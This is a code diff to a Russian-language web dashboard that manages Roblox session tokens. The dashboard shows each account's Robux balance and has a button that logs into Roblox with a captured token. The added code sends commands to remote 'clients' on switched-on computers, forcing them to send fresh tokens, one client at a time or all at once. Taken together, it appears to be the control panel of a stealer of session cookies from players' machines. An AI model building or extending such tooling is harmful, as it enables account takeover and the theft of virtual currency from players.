@@ -132,6 +132,7 @@ function renderTokens() {
     if (t.security) {
       html += '<div style="display:flex; gap:8px;">';
       html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
+      html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 12px; border-color: rgba(0, 240, 255, 0.3); color: var(--accent); background: rgba(0, 240, 255, 0.05);" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')">📡</button>';
       html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 12px; border-color: rgba(255, 0, 85, 0.3); color: var(--danger); background: rgba(255, 0, 85, 0.05);" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\')">🗑️</button>';
       html += '</div>';
       if (valid && t.robux !== undefined && t.robux > 0) {
@@ -228,6 +229,42 @@ document.getElementById('btnCheckAll').addEventListener('click', async function(
   btn.disabled = false;
   btn.innerHTML = '<span style="font-size: 1.2rem;">⟳</span> Проверить все';
 });
+
+// ── Запросить все токены ─────────────────────────────────────────────────────────────
+document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
+  const btn = this;
+  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
+  const originalHtml = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<span style="font-size: 1.2rem;">⏳</span> Запрос...';
+  try {
+    await apiFetch('/request-token-all', { method: 'POST' });
+    toast('✅ Запрос на обновление отправлен всем клиентам!');
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
+  }
+  btn.disabled = false;
+  btn.innerHTML = originalHtml;
+});
+
+// ── Запросить один токен ─────────────────────────────────────────────────────────────
+async function requestToken(filename) {
+  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
+  try {
+    const r = await apiFetch('/request-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename })
+    });
+    if (r.ok) {
+      toast('✅ Запрос на обновление токена отправлен!');
+    } else {
+      toast('❌ Ошибка при отправке запроса', 'err');
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
+  }
+}
 
 // ── Копирование ───────────────────────────────────────────────────────────────
 function copyText(text) {
